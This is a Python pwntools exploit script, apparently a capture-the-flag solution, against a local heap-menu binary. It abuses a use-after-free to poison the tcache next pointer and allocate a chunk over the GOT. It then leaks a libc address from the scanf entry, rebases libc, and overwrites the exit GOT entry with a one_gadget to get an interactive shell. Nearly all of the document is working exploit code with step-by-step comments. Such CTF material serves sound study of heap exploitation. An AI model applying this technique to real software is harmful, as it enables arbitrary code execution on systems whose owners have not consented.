from pwn import *

bin = './pwn_chall'

elf = context.binary = ELF(bin)
libc = elf.libc
p = process(bin)

def alloc(indx):
    p.sendlineafter(b'Choice:', b'1')
    p.sendlineafter(b'Index', str(indx).encode())

def free(indx):
    p.sendlineafter(b'Choice:', b'2')
    p.sendlineafter(b'Index', str(indx).encode())

def edit(indx, payload):
    p.sendlineafter(b'Choice:', b'3')
    p.sendlineafter(b'Index', str(indx).encode())
    p.sendlineafter(b'data', payload)

def view(indx):
    p.sendlineafter(b'Choice:', b'4')
    p.sendlineafter(b'Index', str(indx).encode())

p.recvuntil(b'Exit\n')

'''
Here we are allocating a chunk, then freeing it into tcache.
We can still write to the chunk afterward.

When freed to tcache it takes up these fields:
typedef struct tcache entry {
    struct tcache_entry *next;
    struct tcache_perthread_struct *key;
} tcache_entry;

Having two chunks in the tcache we can simply just overwrite the entry at the top of the lists
next pointer to an arbitrary address

Does not have to be the same two chunks in tcache
'''
alloc(0) #Allocate first chunk
free(0) #Free it into tcache
edit(0, b'A'*16) #Edit that chunk to clobber key and next pointer
free(0) #Free it into tcache again so tcache counter gets to two
edit(0, p64(0x404058)) #Now we overwrite the next pointer to a got address
alloc(1) #Allocating gives us the first chunk, where the next pointer is the got
alloc(2) #Now we are getting a chunk that points to GOT
view(2) #Leaking the libc address

#Leaking scanf got entry
p.recvuntil(b'(0-9): ')
scanf_leak = u64(p.recvuntil(b'\n')[:-1] + b'\x00'*2)
log.info(hex(scanf_leak))

#Rebasing libc
libc.address = scanf_leak - 0x630b0
log.info(hex(libc.address))
one_gadget = libc.address + 0xe3b01 #r15 and rdx need to be 0 which they are

#Overwrite exit with one gadget
alloc(3) #Allocate first chunk
free(3) #Free it into tcache
edit(3, b'A'*16) #Edit that chunk to clobber key and next pointer
free(3) #Free it into tcache again so tcache counter gets to two
edit(3, p64(elf.got['exit'])) #Now we overwrite the next pointer to exit
alloc(4) #Allocating gives us the first chunk, where the next pointer is the got
alloc(5) #Now we are getting a chunk that points to GOT entry for exit
edit(5, p64(one_gadget)) #Writing one gadget to exit
p.sendline(b'5') #Exiting to get one_gadget
p.interactive()
 
